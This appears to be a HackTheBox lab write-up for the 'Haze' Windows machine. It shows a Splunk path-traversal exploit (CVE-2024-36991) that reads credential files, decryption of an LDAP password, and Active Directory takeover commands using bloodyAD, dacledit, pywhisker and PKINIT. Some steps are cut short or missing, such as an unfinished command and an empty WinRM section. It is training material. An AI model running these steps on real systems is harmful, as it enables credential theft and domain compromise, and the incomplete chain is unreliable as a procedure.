## Overview

**Haze** is a Hard-rated HackTheBox Windows machine built around a Splunk path traversal vulnerability that leaks LDAP credentials, leading into a multi-stage Active Directory attack chain. The path to Domain Admin involves gMSA abuse, Shadow Credentials via pywhisker, PKINIT certificate authentication, and finally SeImpersonatePrivilege escalation via SweetPotato.

| Field | Details |
|---|---|
| OS | Windows Server |
| Difficulty | Hard |
| IP | 10.10.11.61 |
| Domain | haze.htb / dc01.haze.htb |

## Exploitation — CVE-2024-36991 (Splunk Path Traversal)

Splunk versions prior to 9.2.2 on Windows are vulnerable to an unauthenticated path traversal via the messaging module endpoint.

```bash
python3 CVE-2024-36991.py -u http://haze.htb:8000
```

```
[VULN] Vulnerable: http://haze.htb:8000
:admin:$6$Ak3m7...::Administrator:admin:changeme@example.com
:edward:$6$3LQH...::Edward@haze.htb:user
:mark:$6$j4Qs...:::user:Mark@haze.htb
:paul:$6$Y5ds...:::user:paul@haze.htb
```

The SHA-512 hashes could not be cracked with rockyou.

### Extracting LDAP Credentials from authentication.conf

```bash
curl -s "http://haze.htb:8000/en-US/modules/messaging/C%3A../C%3A../C%3A../C%3A../C%3A../C%3A../C%3A../C%3A../Program%20Files/Splunk/etc/system/local/authentication.conf"
```

```ini
bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
```

The password is encrypted with Splunk's proprietary encryption. We need `splunk.secret` to decrypt it.

### Retrieving splunk.secret

```bash
curl -s "http://haze.htb:8000/en-US/modules/messaging/C%3A../C%3A../C%3A../C%3A../C%3A../C%3A../C%3A../C%3A../Program%20Files/Splunk/etc/auth/splunk.secret"
```

Save the output to a file named `splunk.secret`.

### Decrypting the LDAP Password

```bash
pip3 install splunksecrets
splunksecrets splunk-legacy-decrypt -S splunk.secret
# Ciphertext: $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
```

```
Ld@p_Auth_Sp1unk@2k24
```

Credentials recovered: `paul.taylor : Ld@p_Auth_Sp1unk@2k24`

## ACL Abuse — Taking Ownership of SUPPORT_SERVICES

BloodHound reveals `Haze-IT-Backup$` has ownership-level control over the `SUPPORT_SERVICES` group.

### Set Owner

```bash
bloodyAD --host "10.10.11.61" -d "haze.htb" \
  -u 'Haze-IT-Backup$' -p ":735C02C6B2DC54C3C8C6891F55279EBC" -f rc4 \
  set owner 'SUPPORT_SERVICES' 'Haze-IT-Backup$'
```

### Grant FullControl via DACL

```bash
impacket-dacledit -action 'write' -rights 'FullControl' \
  -principal 'Haze-IT-Backup$' -target 'support_services' \
  'haze.htb'/'Haze-IT-Backup$' -k -no-pass -dc-ip 10.10.11.61
```

### Add Members to SUPPORT_SERVICES

```bash
bloodyAD --host "10.10.11.61" -d "haze.htb" \
  -u 'Haze-IT-Backup$' -p ":735C02C6B2DC54C3C8C6891F55279EBC" -f rc4 \
  add groupMember 'SUPPORT_SERVICES' 'edward.martin'

bloodyAD --host "10.10.11.61" -d "haze.htb" \
  -u 'Haze-IT-Backup$' -p ":735C02C6B2DC54C3C8C6891F55279EBC" -f rc4 \
```

## Shadow Credentials — Compromising edward.martin

With `GenericWrite` over `edward.martin` via `SUPPORT_SERVICES` membership, we can add a shadow credential (Key Credential) to the account using pywhisker.

```bash
python3 pywhisker.py -d haze.htb \
  -u 'Haze-IT-Backup$' -H ':735C02C6B2DC54C3C8C6891F55279EBC' \
  --target edward.martin --action "add"
```

This generates a `.pfx` certificate and a password.

### PKINIT — Request TGT as edward.martin

```bash
python3 gettgtpkinit.py haze.htb/edward.martin \
  -cert-pfx <generated.pfx> -pfx-pass <password> \
  edward.ccache

export KRB5CCNAME=edward.ccache
```

### Extract NT Hash via U2U

```bash
python3 getnthash.py haze.htb/edward.martin -key <session_key>
```


### WinRM as edward.martin

## Key Takeaways

- **CVE-2024-36991** is an unauthenticated path traversal affecting Splunk on Windows — always check for Splunk instances during enumeration.
- **Splunk's `$7$` encryption** is reversible given `splunk.secret` — config files and backups are high-value targets.
- **gMSA accounts** can be weaponized for ACL abuse and lateral movement when `PrincipalsAllowedToRetrieveManagedPassword` is misconfigured.
- **Shadow Credentials** via pywhisker combined with PKINIT is a reliable path to NT hash recovery without touching LSASS.
- **SeImpersonatePrivilege** on a service account context almost always leads to SYSTEM via potato attacks.
